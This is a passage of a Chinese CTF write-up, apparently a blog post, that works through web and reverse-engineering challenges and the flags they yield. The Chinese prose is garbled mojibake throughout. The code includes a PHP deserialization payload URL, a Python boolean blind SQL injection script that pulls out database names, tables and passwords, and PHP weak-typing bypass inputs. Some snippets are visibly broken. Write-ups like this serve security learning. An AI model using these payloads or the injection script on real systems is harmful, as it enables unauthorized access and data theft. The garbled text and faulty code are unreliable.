ï¼Œæäº¤å°±æœ‰flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Fine_WeBsH3ll}</code></pre><h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><p>phpååºåˆ—åŒ–ï¼Œï¼Œï¼Œè®°å¾—å½“åˆç¬¬ä¸€æ¬¡å‚è§CTFçš„æ—¶å€™å°±æ˜¯è¿™é“é¢˜ä¸ä¼šåšï¼Œå¯¼è‡´å°±å·®è¿™ä¸€é“é¢˜æ²¡èƒ½æ‹¿å¥–</p><p>é¢˜ç›®åœ°å€ï¼š <a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a> </p><pre class=" language-lang-php"><code class="language-lang-php"><!--?phperror_reporting(0);class Test{    private $a = 'nothing';    public function __destruct()    {        if($this--->a != 'nothing') {            highlight_file('flag.php');        }        else {            echo 'No Flag!';        }    }}if(isset($_GET['data'])) {    unserialize($_GET['data']);}else {    highlight_file(__FILE__);}    ?&gt;</code></pre><p>é¢˜ç›®ç»™äº†æºä»£ç ï¼Œä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œæˆ‘ä»¬è¦æ‹¿åˆ°flagçš„è¯ï¼Œå¿…é¡»è®© <strong>a ! =â€™nothingâ€™</strong></p><p>ä½†æ˜¯ <strong>a</strong> åœ¨å£°æ˜çš„æ—¶å€™å·²ç»ç­‰äº <strong>nothing</strong> äº†</p><p>è€Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å‚æ•°åªæœ‰ <strong>data</strong> </p><pre class=" language-lang-php"><code class="language-lang-php">unserialize($_GET['data']);</code></pre><p>ä»è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„<strong>data</strong>å‚æ•°ä¼šè¢«<strong>unserialize()</strong> è¿™ä¸ªå‡½æ•°å¤„ç†</p><p>çœ‹ä¸€ä¸‹ <strong>unserializeï¼ˆï¼‰</strong> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨</p><p> <strong>å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜å› PHP çš„å€¼</strong> </p><p>è¿™å°±å¾ˆæ¸…æ™°æ˜äº†äº†</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡dataä¼ å…¥ä¸€ä¸ªå·²ç»åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ¥è¦†ç›–æ‰ <strong>a</strong> çš„å€¼</p><pre class=" language-lang-php"><code class="language-lang-php"><!--?php    class Test{    private $a = "666";    }    $flag = new Test();    print_r(serialize($flag));?--></code></pre><p>æ‰§è¡Œè¿™æ®µä»£ç åå¾—åˆ°</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"Testa";s:3:"666";}</code></pre><p>ä½†è¿™è¿˜ä¸å¤Ÿ</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"%00Test%00a";s:3:"666";}</code></pre><p>ç”±äºå˜é‡ <strong>a</strong> çš„ç±»å‹ä¸º <strong>private</strong></p><p>å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç±»å <strong>Test</strong> å‰é¢åŠ ä¸Š <strong>%00</strong> </p><p>å…·ä½“è¦å‚è€ƒè¿™ç¯‡æ–‡ç«   <a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a> ï¼ˆHITCON 2016ä¸€é“webï¼‰</p><p>å› æ­¤æˆ‘ä»¬æœ€ç»ˆçš„payloadä¸ºï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">http://47.93.249.236:10009/index.php?data=O:4:%22Test%22:1:{s:7:%22%00Test%00a%22;s:3:%22666%22;}</code></pre><p>è®¿é—®å¾—åˆ° <strong>flag</strong></p><pre class=" language-lang-php"><code class="language-lang-php"><!--?php$flag = 'flag{0030-0571-8890-4673}';?--></code></pre><h2 id="ç™¾åº¦"><a href="#ç™¾åº¦" class="headerlink" title="ç™¾åº¦"></a>ç™¾åº¦</h2><p>è¿™é“é¢˜ä»åå­—ä¸Šå°±å¯ä»¥çŸ¥é“ï¼ˆzuo ti zuo duo le jiu ke yi zhi daoï¼‰,å…³é”®åœ¨<strong>robots.txt</strong> ä¸Šï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç½‘ç«™éƒ½ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œä»–çš„ä¸»è¦åŠŸèƒ½å°±å’Œä»–çš„æ–‡ä»¶å†…å®¹ ä¸€æ ·æ¸…æ™°æ˜äº†</p><pre class=" language-lang-txt"><code class="language-lang-txt">User-agent: *Disallow:</code></pre><p>ä¸»è¦æ˜¯æ¥é˜²çˆ¬è™«ï¼Œåœ¨çœŸå®çš„æ¸—é€æµ‹è¯•æ¡ˆä¾‹ä¸­ç»å¸¸ä¼šå‡ºç°ï¼Œæ¯”å¦‚ç”¨æ¥æ‰¾<strong>admin</strong> ç•Œé¢â€¦.</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{BoBo-RoRo-ToTo}</code></pre><p>è¿˜æœ‰åˆ«çš„ä¸æƒ³è¢«çˆ¬å–åˆ°çš„é¡µé¢ï¼Œå…·ä½“å¯ä»¥çœ‹ç™¾åº¦ä¸Šçš„çš„robots.txt</p><pre class=" language-lang-txt"><code class="language-lang-txt">https://www.baidu.com/robots.txt</code></pre><h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>é¢˜å¦‚å…¶åï¼ŒMySQLæ³¨å…¥ä¸­çš„boolç›²æ³¨</p><p>è¿™é“é¢˜ç”¨ sqlmap å°±å¯ä»¥åšï¼Œå·¥å…·å›ºç„¶å¥½ç”¨ï¼Œä½†æ‹’ç»åšè„šæœ¬å°å­</p><p>ä½†æœ¬ç€å­¦ä¹ çš„ç²¾ç¥ï¼Œä¸»è¦æ˜¯å¥½ä¹…ä¸ç”¨<strong>python</strong>äº†</p><p>å°±å†™äº†ä¸€ä¸ªç®€å•çš„è„šæœ¬ (python2.7)</p><pre class=" language-lang-python"><code class="language-lang-python">import requestsdef login(_username,_password):    url="http://47.93.249.236:10001/index.php"    data={        "username":_username,        "password":_password    }    response=requests.post(url,data=data)    content=response.content    if "Login Success!" in content:        return True    else:        return Falsedef find_dblen():    for i in range(10):        _username = "admin' and (length(database())) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbname():    find_name = ""    length=find_dblen()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr(database(),%d,%d))=%d) #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbtable_len():    for i in range(100):        _username = "admin' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,2)=%d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbtable_name():    find_name = ""    length=find_dbtable_len()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbcolum_len():    for i in range(10):        _username = "admin' and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 0, 1) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbcolum_name():    find_name = ""    for i in range(9):        for j in range(0x80, 0x20, -1):            _username = "admin' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),%d,%d))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_flag():    find_name = ""    for i in range(40):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select password from users limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakif __name__ == '__main__':    find_flag()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{sql1-wArn1ng}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">#sqlç›²æ³¨æ³¨å…¥æµç¨‹:ä¸€ã€çŒœæ•°æ®åº“çš„é•¿åº¦    âˆš 4#              äºŒã€çŒœæ•°æ®åº“çš„åå­—    âˆš mydb#              ä¸‰ã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨çš„åå­—çš„é•¿åº¦ âˆš ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦æ˜¯5#              å››ã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨çš„åå­—  è¡¨åä¸º users#              äº”ã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨ä¸­åˆ—çš„æ•°é‡ âˆš 3#              å…­ã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨ä¸­åˆ—çš„åå­— âˆš id username password#              ä¸ƒã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨ä¸­åˆ—ä¸­å­—æ®µçš„æ•°é‡#              å…«ã€çŒœæ•°æ®åº“ä¸­æ•°æ®è¡¨ä¸­åˆ—ä¸­å­—æ®µçš„åå­—</code></pre><p>ä¸Šé¢æ˜¯æ€»ç»“çš„ä¸€äº›ä¸œè¥¿ï¼Œå¯èƒ½è¿˜ä¸å¤Ÿå®Œå–„</p><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>è¿™é“é¢˜ä¸»è¦æ˜¯æƒ³è€ƒå¯Ÿhashçš„é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œå¯èƒ½æ˜¯å‡ºäºå¯¹æ–°ç”Ÿçš„ç…§é¡¾ï¼Œä¸‹é™äº†éš¾åº¦</p><p>é¢˜ç›®æºç </p><pre class=" language-lang-php"><code class="language-lang-php">function ctt($key){    $t="";    for($i=0;$i &lt; strlen($key) ; ++$i)    {        $t.=chr(ord($key[$i])^$i);    }    return $t;}$auth = false;$role1 = "xxxxxxxxx";$salt = "xxxxxxxxxx";//é•¿åº¦ä¸è¶…è¿‡15if (isset($_COOKIE["role_true"])) {      $hsh = $_COOKIE["hsh"];      if ($_COOKIE["role_true"] === $role1 &amp;&amp; $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {    $auth = true;} else {    $auth = false; } } else {    $s =$role1;    setcookie('role',ctt(base64_encode($s)));                $hsh = md5($salt.ctt(base64_encode($s)));    setcookie('hsh',$hsh); }   if ($auth) {   echo "Welcome Admin. Your flag is ";} else {   echo "Only True Admin can see the flag!!"; }</code></pre><p>ä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬è¦æƒ³è¾“å‡º <strong>flag</strong> å¿…é¡»è¦æ»¡è¶³</p><pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE["role"]))</code></pre><p>é€šè¿‡F12æŸ¥çœ‹æºä»£ç  æˆ‘ä»¬å¯ä»¥å¾—åˆ° </p><pre class=" language-lang-txt"><code class="language-lang-txt">role=YVPweR3oRN%3B%7Bnj32hsh=5beee4019e55f453db9daf0df7d90879</code></pre><p>åˆ†æä»£ç å†™è„šæœ¬è§£å‡º role</p><p>è„šæœ¬ (éœ€è¦å…ˆè§£å‡º <strong>urlè§£ç ä¹‹åçš„role</strong> )</p><pre class=" language-lang-python"><code class="language-lang-python">import base64def dctt(key):    t=''    for i in range(len(key)):        t = t + chr(ord(key[i]) ^ i)    result = base64.b64decode(t)    return resultif __name__ == '__main__':    key = "YVPweR3oRN;{nj32"    print dctt(key)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">role=adminadmin</code></pre><p>å› æ­¤æˆ‘ä»¬ç°åœ¨åªéœ€è¦è®©</p><pre class=" language-lang-txt"><code class="language-lang-txt">role_true=adminadmin</code></pre><p>å°±å¯ä»¥å¾—å‡º <strong>flag</strong> </p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{hash_and_php_are_very_good!!!}</code></pre><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>è¿™é¢˜å¯èƒ½æœ‰é—®é¢˜â€¦</p><pre class=" language-lang-php"><code class="language-lang-php">no include('flag.php');$f1 = @$_GET['f1'];$f2 = @$_POST['f2'];$f3 = @$_COOKIE['f3'];if($f2 !== '0') {    echo 'no';}else {    if($f1 == 0 and $f1 !== 0) {        $f2 == $f3;        if(md5($f2) == 0 and $f2 == 0) {            echo $flag;        }    }}</code></pre><p>è¿˜æ˜¯å…ˆåˆ†æä¸€ä¸‹ä»£ç </p><p>é¦–å…ˆ æˆ‘ä»¬éœ€è¦é€šè¿‡ GET æ–¹å¼ä¼ å…¥ f1 , POST æ–¹å¼ä¼ å…¥ f2 ,å’Œåœ¨ cookie ä¸­è®¾ç½® f3</p><p>å…¶æ¬¡é¦–å…ˆè¦æ»¡è¶³ ï¼ˆä¾æ¬¡ï¼‰</p><pre class=" language-lang-php"><code class="language-lang-php">f2===0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f1=0 f1!==0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0</code></pre><p>ä½†å®é™…è¿‡ç¨‹å‘ç°ï¼Œæˆ‘ä»¬åªè¦è®©</p><pre class=" language-lang-php"><code class="language-lang-php">f1=0abc //phpæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œä¼šå°† '0abc'çœ‹æˆ '0'</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f2=0</code></pre><p>å°±å¯ä»¥å¾—å‡ºflag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><p>ä½†å…¶å®æˆ‘ä»¬è¿˜è¦ä¼ å…¥</p><pre class=" language-lang-php"><code class="language-lang-php">f3[]=0</code></pre><p>æ¥ç»•è¿‡</p><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0</code></pre><p>å¯èƒ½æ˜¯å‡ºé¢˜äººç–å¿½äº†â€¦,æˆ–è€…æˆ‘æƒ³å¤šäº†â€¦.</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><h2 id="æœ‰è¶£çš„ä¸Šä¼ ç‚¹"><a href="#æœ‰è¶£çš„ä¸Šä¼ ç‚¹" class="headerlink" title="æœ‰è¶£çš„ä¸Šä¼ ç‚¹"></a>æœ‰è¶£çš„ä¸Šä¼ ç‚¹</h2><p>ç¡®å®æœ‰è¶£ï¼Œä¸€ç‚¹æ€è·¯æ²¡æœ‰ï¼Œä¸Šä¼ è¿‡å»æ–‡ä»¶å°±æ²¡äº†ï¼Œè®¿é—®ä¹Ÿè®¿é—®ä¸åˆ°ï¼Œç”¨å·¥å…·æ‰«å‡ºæ¥äº†XSSï¼Œä½†ç”¨ä¸äº†â€¦</p><p>çœŸçš„ä¸ä¼šå†™ï¼Œä¹Ÿæ²¡äººåšå‡ºæ¥ï¼Œèµ›åçœ‹å®˜æ–¹WPååœ¨å†™ä¸€ç¯‡ä¸“é—¨å…³äºè¿™ä¸ªé¢˜çš„å§</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>POSTä¼ å‚æ•°ï¼Œç”¨ç«ç‹çš„hackbaræˆ–è€…BpæŠ“åŒ…æ”¹è¯·æ±‚æ–¹å¼éƒ½å¯ä»¥</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Tw0~E4sy-pHp}</code></pre><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>GETä¼ å‚æ•°ï¼Œç›´æ¥åœ¨URLåé¢å†™å°±è¡Œ</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{A~E4sy-pHp}</code></pre><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>webéƒ¨åˆ†åˆ°è¿™é‡Œå°±å®Œäº†ï¼Œæ¯é“é¢˜éƒ½ä¸æ˜¯å¾ˆéš¾ï¼Œå…³é”®æ˜¯æ‰¾é‡Œé¢çš„çŸ¥è¯†ç‚¹æ¥å­¦ï¼Œéš¾çš„é¢˜ä¹Ÿä¸è¿‡å°±æ˜¯æŠŠä¸€äº›ç®€å•çš„çŸ¥è¯†ç‚¹ç»™é›†åˆèµ·æ¥ï¼Œå…³äºGET,POSTè¯·æ±‚éƒ¨åˆ†çš„ä¸œè¥¿æˆ‘ä¼šæ”¾åœ¨GO Webå­¦ä¹ å½“ä¸­æ¥è®¨è®ºã€‚</p><h1 id="ç¬¬äºŒéƒ¨åˆ†-Reverse"><a href="#ç¬¬äºŒéƒ¨åˆ†-Reverse" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† Reverse"></a>ç¬¬äºŒéƒ¨åˆ† Reverse</h1><p>è¿™ä¸€éƒ¨åˆ†æ€»å…±æœ‰5é“é¢˜ï¼Œé™¤äº†ç‚¹å‡»ä¸€åƒæ¬¡æœ‰ç‚¹åºŸç™¾åº¦ä¹‹å¤–ï¼Œå…¶ä»–çš„é¢˜éƒ½è¿˜æ˜¯å¾ˆåŸºç¡€çš„</p><h2 id="Android-Studio-Usage"><a href="#Android-Studio-Usage" class="headerlink" title="Android Studio Usage"></a>Android Studio Usage</h2><p>å®‰å“é€†å‘é¢˜ï¼Œä¸»è¦è€ƒå¯Ÿçš„å°±æ˜¯å®‰å“ç¨‹åºçš„ç»“æ„ï¼Œä½†flag ä¸€å¼€å§‹ç»™é”™äº†ï¼ŒåŠ ä¸Šé‚£ä¸ªhanhançš„å‡½æ•°è®©æˆ‘è§‰å¾—æˆ‘ä¹Ÿæ‰¾é”™äº†ï¼Œç›´åˆ°flagæ”¹äº†å›æ¥ã€‚æˆ‘äººå‚»äº†ï¼Œæˆ‘å°±æ˜¯ä¸ªhanhan,è¿˜ä¸‹äº†Android Studioæ¥æ‰¾ï¼Œæ‰¾æ¥æ‰¾å»ä¹Ÿå°±é‚£ä¸€ä¸²â€¦..</p><p>ä¸å¤šè¯´äº†ï¼Œå…ˆæ”¾ä¸€ä¸‹Android ç¨‹åºçš„ç»“æ„</p><pre class=" language-lang-txt"><code class="language-lang-txt">EMMM,å›¾åºŠæ²¡æ­å¥½å…ˆä¸æ”¾äº†ï¼Œ</code></pre><p>æ ¹æ®ç»“æ„æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸»ç¨‹åºçš„ä½ç½®å°±åœ¨</p><pre class=" language-lang-txt"><code class="language-lang-txt">\MyApplication\app\src\main\java\</code></pre><p>é‡Œé¢ï¼Œè€Œé‡Œé¢åªæœ‰ä¸€ä¸ªhanhan.java</p><p>é‡Œé¢çš„å†…å®¹æ˜¯</p><pre class=" language-lang-java"><code class="language-lang-java">import java.util.Scanner;public class hanhan {    public static void main(String[] args) {        // TODO Auto-generated method stub        Scanner in =new Scanner(System.in);        String yours;        String people="ZmxhZ3tZb3UgYXJlIHNpbXBsZSBhbmQgaG9uZXN0fQ==";    }}</code></pre><p>é‚£  flag å°±æ˜¾è€Œæ˜“è§äº†ï¼Œ</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{You are simple and honest}</code></pre><h2 id="çŒœæ•°ï¼Ÿ"><a href="#çŒœæ•°ï¼Ÿ" class="headerlink" title="çŒœæ•°ï¼Ÿ"></a>çŒœæ•°ï¼Ÿ</h2><p>IDA æºä»£ç ï¼ˆ64ä½ï¼‰åˆ†æ å‘ç°</p><pre class=" language-lang-c"><code class="language-lang-c">#include<studio.h>int main(){  int result; // eax@4  __int64 v4; // rsi@4  __int64 v5; // [sp+8h] [bp-38h]@1  __int64 v6; // [sp+10h] [bp-30h]@1  __int64 v7; // [sp+18h] [bp-28h]@1  __int64 v8; // [sp+20h] [bp-20h]@1  __int64 v9; // [sp+28h] [bp-18h]@1  __int64 v10; // [sp+30h] [bp-10h]@1  __int64 v11; // [sp+38h] [bp-8h]@1  v11 = *MK_FP(__FS__, 40LL);  v5 = 0LL;  srand(10520);  v6 = rand() % 10520;  v7 = rand() % 10520;  v8 = rand() % 10520;  v9 = rand() % 10520;  v10 = v8 + v7 + v6 + v9;  printf("Input your key:", argv);  __isoc99_scanf("%ld", &amp;v5);  if ( v10 == v5 )    printf("flag{cdusec_wsj_%ld}", v5);  else    printf("wrong!");  result = 0;  v4 = *MK_FP(__FS__, 40LL) ^ v11;  return 0;}</studio.h></code></pre><p>å¤§æ¦‚å°±æ˜¯æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªæ•°ï¼Œå¹¶ä¸”è¿™ä¸ªæ•°è¦ç­‰äº<strong>v10</strong> ä¹Ÿå°±æ˜¯å››ä¸ªéšæœºçš„æ•°ç›¸åŠ </p><p>æˆ‘ä»¬å‘ç°<strong>srand()</strong>å‡½æ•°ä¸­åªæœ‰ä¸€ä¸ªå‚æ•°</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå½“<strong>srand()</strong> å‡½æ•°é‡Œåªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™ä¼šç”Ÿæˆä¼ªéšæœºæ•°</p><p>ä¼ªéšæœºæ•°ä¹Ÿå°±æ˜¯å½“<strong>srand()</strong>è¿™ä¸ªå‡½æ•°é‡Œçš„å‚æ•°ç¡®å®šäº†ä»¥åï¼Œç”Ÿæˆçš„éšæœºæ•°å°†ä¸ä¼šå‘ç”Ÿæ”¹å˜</p><p>çŸ¥é“äº†è¿™ä¸ªåŸç†ä»¥åï¼Œæˆ‘ä»¬ç¼–å†™è„šæœ¬</p><pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>int main(){    int v6,v7,v8,v9;    int result;    srand(10520);    v6 = rand() % 10520;    v7 = rand() % 10520;    v8 = rand() % 10520;    v9 = rand() % 10520;    result=v6+v7+v8+v9;    printf("%ld",result);    return 0}</stdio.h></code></pre><p>å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªç¨‹åºåœ¨linuxä¸‹è¿è¡Œå’Œåœ¨windowsä¸‹è¿è¡Œç»“æœæ˜¯ä¸ä¸€æ ·çš„</p><p>å‘½ä»¤ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -o flag flag.c./flag</code></pre><p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä»–å«linuxçš„åŸå› å§</p><p>ç»“æœï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">23231</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_wsj_23231}</code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>è¿™é“é¢˜æ¯”è¾ƒç®€å•ç›´æ¥ç»™äº†ä¸€ä¸ªå¯ä»¥è¿è¡Œçš„pythonæ–‡ä»¶ï¼ˆpython3.xï¼‰</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'a= input()a=a.encode()c=''for i in a:    #print(i)    c=c+chr(i^3)#print(c)if(c.encode()==b):    print("youare right:")    print(a)else:    print("wrong!")</code></pre><p>è¿™å°±ç®€å•äº†ï¼Œä¸€é¡¿åˆ†æä¹‹å</p><p>ç›´æ¥ä¿®æ”¹è„šæœ¬</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'c=''for i in b:    c=c+chr(i^3)print(c)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_rec2_easy}</code></pre><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>IDAä¸­F5æŸ¥çœ‹ä¼ªä»£ç ï¼ˆ32ä½ï¼‰</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  signed int v3; // esi@1  signed int v4; // ecx@1  int result; // eax@11  char v6; // [sp+8h] [bp-8h]@1  char v7; // [sp+9h] [bp-7h]@4  char v8; // [sp+Ah] [bp-6h]@4  char v9[5]; // [sp+Bh] [bp-5h]@4  v3 = 1;  printf(Format);  scanf(aS, &amp;v6);  v4 = 0;  do  {    if ( v4 % 4 )      goto LABEL_9;    if ( !(v4 / 4) )    {      if ( *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251 )        goto LABEL_9;LABEL_8:      v3 = 0;      goto LABEL_9;    }    if ( v4 / 4 == 1 &amp;&amp; *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365 )      goto LABEL_8;LABEL_9:    ++v4;  }  while ( v4 &lt; 8 );  if ( v3 == 1 )  {    printf(aFlagS_1, &amp;v6);    result = system(Command);  }  else  {    printf(aWrongKey);    result = system(Command);c  }  return result;}</code></pre><p>å‘ç°flagçš„å‰å››ä½è¦æ»¡è¶³</p><pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251</code></pre><p>åå››ä½è¦æ»¡è¶³</p><pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365</code></pre><p>ä¹Ÿå°±æ˜¯è¯´flagæ€»å…±æœ‰8ä½</p><p>å…ˆæ¥ä¸€æ‰‹çŒœflag</p><pre class=" language-lang-txt"><code class="language-lang-txt">cdus ecre</code></pre><p>åˆšå¥½å…«ä½ï¼ˆæ‰‹åŠ¨æ–œçœ¼ç¬‘ï¼‰</p><p>æˆåŠŸå¾—åˆ°flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><p>å¼€ä¸ªç©ç¬‘ï¼Œè¿™é¢˜è¿˜æ˜¯è¦å†™è„šæœ¬çš„</p><p>å–å‡ºè¡¨è¾¾å¼</p><pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251v5 + (( v6 + ((v7 + (v8 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251</code></pre><pre class=" language-lang-python"><code class="language-lang-python">flag='qwertyuiopasdfghjklzxcvbnm'def run(number):    for a in range flag:        for b in range flag:            for c in range flag:                for d in range flag:                    if ord(a)+ord(b)+ord(c)+ord(d)=number:                        print a+b+c+drun()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><h2 id="ç‚¹å‡»1000æ¬¡"><a href="#ç‚¹å‡»1000æ¬¡" class="headerlink" title="ç‚¹å‡»1000æ¬¡"></a>ç‚¹å‡»1000æ¬¡</h2><p>å¦‚æœè¯´reé‡Œè¾¹æœ€éš¾çš„é‚£ä¸€ä¸ªçš„è¯ï¼Œé‚£åº”è¯¥å°±æ˜¯è¿™é“é¢˜äº†ï¼Œå‡ºé¢˜äººç»™çš„hintå»ºè®®æ˜¯ç”¨ollydbgåšï¼Œæ²¡å­¦è¿‡ï¼ŒèŠ±äº†åŠå¤©çš„æ—¶é—´å­¦äº†ä¸€ä¸‹ï¼Œç„¶åå¼€å§‹æœ¬é¢˜</p><p>é¢˜ç›®ä¸Šå†™çš„æ˜¯ç‚¹å‡»1000æ¬¡ç»™ä¸€ä¸ªflagå­—ç¬¦ï¼Œç«¥åŸæ— æ¬ºã€‚</p><p>å…ˆç”¨IDA æŸ¥çœ‹ä¼ªä»£ç (32ä½)</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401277(){  int result; // eax@3  unsigned __int8 *v1; // [sp+0h] [bp-8h]@1  void *lpMem; // [sp+4h] [bp-4h]@1  lpMem = (void *)sub_4015F2(1, ++dword_4A32C0);  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&amp;unk_480B5F);  if ( lpMem )    sub_4015FE(lpMem);  result = sub_4015F8((HWND)0x52010001, 100728832, 8, -1, v1, 0);  if ( v1 )    result = sub_4015FE(v1);  if ( dword_4A32C0 == 1000 )  {    result = sub_401323();    dword_4A32C0 = 0;  }  return result;}</code></pre><p>ä»ä»£ç æˆ‘ä»¬å¯ä»¥çŒœåˆ°</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C0 == 1000</code></pre><p>è¿™ä¸ªå°±æ˜¯åˆ¤æ–­çš„æ¡ä»¶</p><p>é‚£ä¹ˆè¿™ä¸ª</p><pre class=" language-lang-c"><code class="language-lang-c">sub_401323()</code></pre><p>æ˜¯å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿ</p><p>è·Ÿè¿›å»çœ‹çœ‹</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401323(){  int result; // eax@13  char v1; // al@16  void *lpMem; // [sp+4h] [bp-8h]@16  if ( dword_4A32C4 == 1 )    